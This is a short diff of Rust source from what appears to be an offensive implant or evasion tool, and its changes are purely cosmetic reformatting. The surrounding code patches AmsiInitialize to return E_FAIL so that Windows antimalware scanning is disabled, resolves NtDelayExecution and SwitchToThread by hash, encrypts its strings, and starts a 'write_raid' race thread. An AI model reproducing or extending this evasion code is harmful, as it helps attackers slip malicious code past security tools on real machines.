@@ -477,7 +477,9 @@ fn set_init_failed_flag() {
             nt_protect(init_fn, patch.len(), old, &mut old);
             tracing::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
         } else {
-            tracing::warn!("set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize");
+            tracing::warn!(
+                "set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize"
+            );
         }
     }
 }
@@ -800,10 +802,11 @@ mod write_raid {
         // Also resolve NtDelayExecution for yielding.
         let delay_hash = pe_resolve::hash_str(&string_crypt::enc_str!("NtDelayExecution\0"));
         let delay_fn = pe_resolve::get_proc_address_by_hash(ntdll_base, delay_hash);
-        let switch_thread_fn = super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
-            pe_resolve::HASH_KERNEL32_DLL,
-            super::win_resolve::HASH_SWITCHTOTHREAD,
-        );
+        let switch_thread_fn =
+            super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
+                pe_resolve::HASH_KERNEL32_DLL,
+                super::win_resolve::HASH_SWITCHTOTHREAD,
+            );
 
         tracing::info!("write_raid: race thread started");
 
